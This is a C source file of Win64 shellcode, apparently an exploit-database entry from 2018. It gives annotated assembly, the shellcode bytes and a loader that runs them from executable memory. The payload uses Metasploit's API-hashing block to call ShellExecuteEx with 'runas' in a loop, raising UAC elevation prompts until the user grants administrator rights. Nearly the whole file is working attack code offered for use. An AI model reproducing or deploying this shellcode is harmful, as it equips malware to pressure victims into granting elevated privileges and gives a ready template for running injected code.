/*
 
# Win64 - UAC Self Elevate Shellcode (343 bytes)
# Date: [14.12.2018]
# Author: [Ege Balcı]
# Tested on: [Win 7/10]
 
This shellcode rapidly creates a UAC elevation popup for the current process until it elevates.
-----------------------------------------------------------------
 

[BITS 32]
 
    cld                          ; Clear direction flags
    call start                   ; Get the address of api block to stack
    %include "../block_api.asm"  ; https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm
start:
    pop rbp                      ; Pop the address of api block
elevate:
 	sub rsp,0x1a8			     ; szPath[MAX_PATH]
	xor rcx,rcx                  ; NULL
	mov rdx,rsp                  ; &szPath
	mov rsi,rsp                  ; Save &szPath to RSI for later
	mov r8,0x1a8                 ; ARRAYSIZE(szPath)
	mov r10d,0xFE61445D          ; hash( "KERNEL32.dll", "GetModuleFileNameA" )
	call rbp                     ; GetModuleFileName(NULL,szPath,ARRAYSIZE(szPath))	
;--------------------------------;
	mov rbx,0x006c6c642e32336c   ; "lld.32l"
	push rbx                     ; ...
	mov rbx,0x6c65687300000000   ; "lesh",0x00
	push rbx                     ; ...
	lea rcx,[rsp+4]              ; &"shell32.dll"
	mov r10d,0x0726774C          ; hash( "KERNEL32.dll", "LoadLibraryA" )
	call rbp                     ; LoadLibraryA(&"shell32.dll")
;--------------------------------;	
	mov rbx,0x0073616e75720000   ; "runas",0x00
	push rbx                     ; ...
	lea rbx,[rsp+2]              ; Save &"runas" to RBX
	push qword 0x00              ; 0x00
	push qword 0x00              ; 0x00
	push qword 0x00              ; 0x00
	push qword 0x00              ; 0x00
	push qword 0x00              ; 0x00
	push qword 0x00              ; 0x00
	push qword 0x00              ; 0x00
	push qword 0x01              ; 0x00
	push qword 0x00              ; 0x00
	push qword 0x00              ; 0x00
	push rsi                     ; SHELLEXECUTEINFO.lpFile = szPath
	push rbx                     ; SHELLEXECUTEINFO.lpVerb = "runas"
	push qword 0x00              ; SHELLEXECUTEINFO.hwnd = 0
    push qword 0x70              ; SHELLEXECUTEINFO.cbSize = 0x3c
	mov rcx,rsp                  ; Move &SHELLEXECUTEINFO to EDI
	push qword 0x01              ; argc
	mov r10d,0x02A9E686          ; hash( "SHELL32.dll", "ShellExecuteExA" )
	call rbp                     ; ShellExecuteExA(&SHELLEXECUTEINFO)
	add rsp,0x298                ; Fix the stack 
	test rax,rax                 ; Check error
	jz elevate                   ; Ask until process elevates ;)



*/

unsigned char shellcode[] = {
  0xfc, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
  0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52,
  0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7,
  0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c,
  0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
  0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01,
  0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x75, 0x72, 0x8b, 0x80, 0x88,
  0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50,
  0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56,
  0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31,
  0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
  0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
  0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41,
  0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b,
  0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
  0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52,
  0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4f, 0xff,
  0xff, 0xff, 0x5d, 0x48, 0x81, 0xec, 0xa8, 0x01, 0x00, 0x00, 0x48, 0x31,
  0xc9, 0x48, 0x89, 0xe2, 0x48, 0x89, 0xe6, 0x41, 0xb8, 0xa8, 0x01, 0x00,
  0x00, 0x41, 0xba, 0x5d, 0x44, 0x61, 0xfe, 0xff, 0xd5, 0x48, 0xbb, 0x6c,
  0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x00, 0x53, 0x48, 0xbb, 0x00, 0x00,
  0x00, 0x00, 0x73, 0x68, 0x65, 0x6c, 0x53, 0x48, 0x8d, 0x4c, 0x24, 0x04,
  0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x48, 0xbb, 0x00, 0x00,
  0x72, 0x75, 0x6e, 0x61, 0x73, 0x00, 0x53, 0x48, 0x8d, 0x5c, 0x24, 0x02,
  0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00,
  0x6a, 0x00, 0x6a, 0x01, 0x6a, 0x00, 0x6a, 0x00, 0x56, 0x53, 0x6a, 0x00,
  0x6a, 0x70, 0x48, 0x89, 0xe1, 0x6a, 0x01, 0x41, 0xba, 0x86, 0xe6, 0xa9,
  0x02, 0xff, 0xd5, 0x48, 0x81, 0xc4, 0x98, 0x02, 0x00, 0x00, 0x48, 0x85,
  0xc0, 0x0f, 0x84, 0x78, 0xff, 0xff, 0xff
};

#include <windows.h>

int main(int argc, char const *argv[])
{
    char* BUFFER = (char*)VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(BUFFER, shellcode, sizeof(shellcode));
    (*(void(*)())BUFFER)(); 
	return 0;
}